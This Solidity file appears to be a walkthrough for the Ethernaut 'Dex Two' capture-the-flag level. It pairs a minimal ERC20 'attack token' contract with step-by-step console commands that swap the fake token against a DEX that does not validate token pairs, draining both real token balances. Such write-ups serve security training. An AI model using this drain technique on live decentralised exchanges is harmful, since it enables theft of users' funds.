/*
As they have added the onlyOwner modifier to the add_liquidity() function, when we try to call the add_liquidity() function in the console to supply the initial 100 MAL tokens to the DexTwo contract as follows:
await contract.add_liquidity(MAL, 100)
We get the following error:
execution reverted: Ownable: caller is not the owner'
Thus, I guess, we can no longer supply these initial 100 MAL tokens by calling the add_liquidity() function of DexTwo contract. 
SOLUTION:
Instead, we can use the transfer() function of our MaliciousToken contract (from Remix) to send 100 MAL tokens to the target (instance) address. And then we can start swapping and draining! ;)

Tools needed for this level:
-Console
-Remix IDE

1.- Deploy this contract (DexTwoAttackToken) with Remix using Injected Web3 environment.

2.- Approve the 400 tokens for Ethernaut's DexTwo contract address using Remix to be able to swap them.

3.- Copy the address of deployed contract and declare it in the console:
attack = "replace_with_deployed_contract_address"

4.- Declare the tokens addresses via console (one by one):
tk1 = await contract.token1()
tk2 = await contract.token2()

5.- Transfer 100 attack tokens from deployed contract to Ethernaut's Dex Two contract using Remix

6.- Swap 100 attack tokens for 100 tk1 tokens:
await contract.swap(attack, tk1, 100)
    
7.- Swap 200 attack tokens for 100 tk2 tokens (ratio changes given the actual balance of Dex Two):
await contract.swap(attack, tk2, 200)

8.- Check if both token balances on Dex Two are drained:
String(await contract.balanceOf(tk1, instance));
String(await contract.balanceOf(tk2, instance));
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol';

contract DexTwoAttackToken is ERC20 {
	uint256 supply = 400;

	constructor() ERC20('AttackToken', 'ATK') {
		ERC20._mint(msg.sender, supply);
	}
}
